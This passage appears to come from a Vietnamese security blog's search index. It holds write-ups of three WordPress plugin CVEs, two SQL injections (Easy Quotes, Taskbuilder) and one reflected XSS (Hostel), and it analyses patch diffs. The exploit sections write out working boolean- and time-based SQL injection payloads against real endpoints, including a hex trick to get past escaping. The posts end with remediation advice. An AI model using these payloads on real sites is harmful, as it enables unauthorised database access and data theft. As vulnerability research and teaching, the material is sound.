v1.2.2\u0026rdquo; }\nget_family_data() ƒë∆∞·ª£c g·ªçi trong 2 h√†m get_family() v√† get_font_variants() c·ªßa class Quotes_Data, ƒë·ªÉ bi·∫øt ch√∫ng s·ª≠ d·ª•ng ·ªü ƒë√¢u, ta t√¨m ki·∫øn v·ªõi t·ª´ kh√≥a get_family ho·∫∑c get_font_variants\nH√†m get_font_variants() ƒë∆∞·ª£c g·ªçi trong h√†m rest_route_callback_font_variants() c·ªßa class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } H√†m kh·ªüi t·∫°o c·ªßa class Quotes_Rest_Route s·ª≠ d·ª•ng add_action(hook_name, callback) v·ªõi hook_name l√† rest_api_init ƒë·ªÉ ƒëƒÉng k√Ω c√°c endpoint t√πy ch·ªânh v·ªõi REST API System c·ªßa WordPress\nCallback rest_api_init s·ª≠ d·ª•ng register_rest_route nhi·ªÅu l·∫ßn ƒë·ªÉ t·∫°o c√°c endpoint d∆∞·ªõi namespace layart/v1\nrest_route_callback_font_variants l√† callback c·ªßa endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family m·∫∑c ƒë·ªãnh l√† Shadows Into Light n·∫øu kh√¥ng ƒë∆∞·ª£c truy·ªÅn trong param.\nExploit Detect SQLi Ta th·ª≠ k·ªπ thu·∫≠t Boolean-based SQL Injection ƒë·ªÉ ki·ªÉm tra xem tham s·ªë family c√≥ d·ªÖ b·ªã ch√®n l·ªánh SQL hay kh√¥ng.\nTrue request: Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; ƒêi·ªÅu ki·ªán AND '1'='1' lu√¥n ƒë√∫ng =\u0026gt; query h·ª£p l·ªá, tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng.\nFalse request: Khi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; ƒêi·ªÅu ki·ªán AND '1'='2' lu√¥n sai =\u0026gt; query kh√¥ng kh·ªõp =\u0026gt; tr·∫£ v·ªÅ [].\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nDatabase name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w {: .prompt-info }\nResponse tr·∫£ v·ªÅ d·ªØ li·ªáu b√¨nh th∆∞·ªùng =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n l√† w\nKhi ƒë√≥, c√¢u query th·ª±c thi s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Automatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t boolean base ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-26943 trong plugin WordPress Easy Quotes tr∆∞·ªõc phi√™n b·∫£n 1.2.3 xu·∫•t ph√°t t·ª´ vi·ªác kh√¥ng s·ª≠ d·ª•ng c∆° ch·∫ø chu·∫©n b·ªã truy v·∫•n ($wpdb-\u0026gt;prepare) m√† truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u l·ªánh SQL d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ thay th·∫ø vi·ªác n·ªëi chu·ªói b·∫±ng c√°ch d√πng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-03-cve-2025-26943/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) v√† v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† \u003cstrong\u003ekh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá\u003c/strong\u003e khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Taskbuilder c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.0.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) v√† v4.0.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n '...'. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ OR, AND,...) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/admin/projects/get_users.php\nTrong phi√™n b·∫£n v4.0.1, bi·∫øn $proj_id sau khi escape ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u truy v·∫•n m√† kh√¥ng c√≥ d·∫•u nh√°y ƒë∆°n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n·ªû b·∫£n v4.0.2, truy v·∫•n ƒë√£ ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh b·∫±ng c√°ch ƒë·∫∑t $proj_id trong d·∫•u nh√°y ƒë∆°n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.2\u0026rdquo; }\nB·∫£n v√° n√†y ƒë·∫£m b·∫£o r·∫±ng gi√° tr·ªã $proj_id sau khi escape ƒë∆∞·ª£c coi l√† m·ªôt chu·ªói literal, kh√¥ng th·ªÉ tho√°t ra kh·ªèi d·∫•u nh√°y ƒë∆°n ƒë·ªÉ ch√®n th√™m c√∫ ph√°p SQL, qua ƒë√≥ ngƒÉn ch·∫∑n t·∫•n c√¥ng SQL Injection.\nHow it work? File architecture:\nC·∫•u tr√∫c chung c·ªßa file hi·ªán t·∫°i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o n·ªôi dung ch√≠nh (body) c·ªßa modal ob_start(); // ... render HTML danh s√°ch users $body = ob_get_clean(); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o ph·∫ßn footer c·ªßa modal ob_start(); // ... render HTML c√°c n√∫t thao t√°c (Close, Save) $footer = ob_get_clean(); // Tr·∫£ d·ªØ li·ªáu JSON ƒë·ªÉ frontend hi·ªÉn th·ªã modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n$proj_id / $project: L·∫•y d·ªØ li·ªáu project t·ª´ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay v√¨ xu·∫•t tr·ª±c ti·∫øp, gi√∫p gom n·ªôi dung v√†o bi·∫øn. $body / $footer: Ch·ª©a n·ªôi dung HTML ƒë·ªông c·ªßa modal. json_encode(): Tr·∫£ JSON cho client, c√≥ kh·∫£ nƒÉng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong Ajax ƒë·ªÉ hi·ªÉn th·ªã modal m√† kh√¥ng c·∫ßn refresh trang. File n·∫±m trong th∆∞ m·ª•c includes cho th·∫•y r·∫±ng n√≥ s·∫Ω ƒë∆∞·ª£c g·ªçi ·ªü 1 ch·ª©c nƒÉng n√†o ƒë√≥ ·ªü n∆°i kh√°c. ƒê·ªÉ bi·∫øt ch·ª©c nƒÉng n√†o s·ª≠ d·ª•ng n√≥, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_users.php trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ N√≥ ƒë∆∞·ª£c include trong h√†m wppm_get_users() c·ªßa class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() l√† callback c·ªßa action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } {: file=\u0026ldquo;includes/class-wppm-admin.php v4.0.1\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. wp_ajax_wppm_get_users l√† t√™n hook Ajax, v·ªõi quy t·∫Øc ƒë·∫∑t t√™n: wp_ajax_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ƒë√£ ƒëƒÉng nh·∫≠p. wp_ajax_nopriv_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ch∆∞a ƒëƒÉng nh·∫≠p. ·ªû ƒë√¢y, action = wppm_get_users. Nghƒ©a l√† n·∫øu trong Ajax request b·∫°n g·ª≠i action=wppm_get_users t·ªõi admin-ajax.php, th√¨ WordPress s·∫Ω t√¨m callback t∆∞∆°ng ·ª©ng ƒë·ªÉ x·ª≠ l√Ω, ·ªü ƒë√¢y l√† wppm_get_users(). üëâ Ta ƒë√£ bi·∫øt ƒë∆∞·ª£c action = wppm_get_users, ki·ªÉm tra xem Ajax n√†o s·ª≠ d·ª•ng action n√†y b·∫±ng c√°ch t√¨m t·ª´ kh√≥a wppm_get_users tr√™n c√°c file .js trong th∆∞ m·ª•c ch·ª©a plugin.\nAction wppm_get_users l√† ph·∫ßn data trong request POST c·ªßa h√†m wppm_get_users()\nH√†m wppm_get_users() s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t trong HTML attribute c·ªßa ch·ª©c nƒÉng project\nT·∫°o project m·ªõi Truy c·∫≠p v√†o project ƒë√≥ Inspect code v√† t√¨m h√†m wppm_get_users s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t ·ªü ƒë√¢u, h√†nh ƒë·ªông n√†o s·∫Ω g·ªçi n√≥ üëâ Khi click v√†o icon b√™n c·∫°nh Users ajax s·∫Ω ho·∫°t ƒë·ªông, g·ª≠i request ƒë·∫øn server, l·∫•y danh s√°ch c√°c user tham gia project v√† m√£ HTML hi·ªÉn th·ªã n√≥.\nExploit Detect SQLi B·∫Øt request b·∫±ng BurpSuite, g·ª≠i request v·ªõi SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id ƒë√∫ng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w t∆∞∆°ng ·ª©ng v·ªõi m√£ HEX l√† 0x77 {: .prompt-info }\nS·ª≠ d·ª•ng SUBSTRING(STRING,1,1) ƒë·ªÉ l·∫•y k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa chu·ªói\n·ªû ƒë√¢y, $proj_id b·∫±ng 4 v√¨ SUBSTRING('wordpress',1,1)=0x77 l√† ƒë√∫ng n√™n SELECT l·∫•y gi√° tr·ªã ƒë√∫ng trong IF(condition, value if true, value if false), 4 l√† gi√° tr·ªã c√≥ th·ª±c trong database, n√™n response tr·∫£ v·ªÅ ch·ª©a danh s√°ch ng∆∞·ªùi tham gia d·ª± √°n\nS·ª≠ d·ª•ng HEX technique ƒë·ªÉ bypass h√†m esc_sql() ·ªü tr√™n, d√πng ƒë·ªÉ so s√°nh khi kh√¥ng s·ª≠ d√πng ƒë∆∞·ª£c '\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) V·ªõi proj_id kh√¥ng c√≥ th·ª±c trong database, response s·∫Ω tr·∫£ v·ªÅ k·∫øt qu·∫£ ch·ª©a None\nüëâ Ta ƒë√£ l·∫•y ƒë∆∞·ª£c k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa database name b·∫±ng k·ªπ thu·∫≠t boolean base\nproj_id ƒë√πng: response kh√¥ng ch·ª©a None proj_id sai: response ch·ª©a None C√≥ th·ªÉ s·ª≠ d·ª•ng k·ªπ thu·∫≠t time base nh∆∞ng khi dump s·ªë l∆∞·ª£ng l·ªõn data, th·ªùi gian dump s·∫Ω r·∫•t l√¢u {: .prompt-info }\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t boolean base ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-39569 trong plugin WordPress Taskbuilder xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øu d·∫•u nh√°y ƒë∆°n '...' bao quanh d·ªØ li·ªáu ƒë·∫ßu v√†o trong c√¢u l·ªánh SQL, khi·∫øn d·ªØ li·ªáu ng∆∞·ªùi d√πng c√≥ th·ªÉ ƒë∆∞·ª£c di·ªÖn gi·∫£i nh∆∞ m·ªôt ph·∫ßn c·ªßa c√¢u l·ªánh SQL h·ª£p l·ªá.\nB·∫£n v√° ·ªü phi√™n b·∫£n 4.0.2 ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch ƒë∆∞a $proj_id v√†o trong '...', ƒë·∫£m b·∫£o n√≥ lu√¥n ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ m·ªôt literal string trong SQL.\nKey takeaways:\n∆Øu ti√™n s·ª≠ d·ª•ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay v√¨ t·ª± ch√®n d·ªØ li·ªáu v√†o query. ƒê·ªëi v·ªõi c√°c plugin WordPress, c·∫ßn test k·ªπ l∆∞·ª°ng c√°c Ajax endpoint v√¨ ƒë√¢y l√† n∆°i d·ªÖ xu·∫•t hi·ªán SQLi v√† XSS nh·∫•t. Ng∆∞·ªùi qu·∫£n tr·ªã c·∫ßn th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin/theme ƒë·ªÉ nh·∫≠n b·∫£n v√° k·ªãp th·ªùi. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-08-31-cve-2025-39569/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) v√† v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ \u003cstrong\u003ex·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o\u003c/strong\u003e tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n \u003ccode\u003e'...'\u003c/code\u003e. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Hostel c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.1.5.8. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ admin.\nCVE ID: CVE-2025-6234 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 1.1.5.8 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.7(vul) v√† v1.1.5.8(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán sanitize (l√†m s·∫°ch d·ªØ li·ªáu) v√† escape (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng Reflected Cross-Site Scripting (XSS)\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file views/bookings.html.php v√† controllers/bookings.php\nFile views/bookings.html.php\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.7\u0026rdquo; }\nTham s·ªë ob ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ $_GET['ob'] v√† echo ra HTML attribute m√† kh√¥ng c√≥ b·∫•t k√¨ x·ª≠ l√Ω escape n√†o. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn nguy c∆° Reflected XSS (Cross-Site Scripting), v√¨ attacker c√≥ th·ªÉ ch√®n payload v√†o query string,\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, 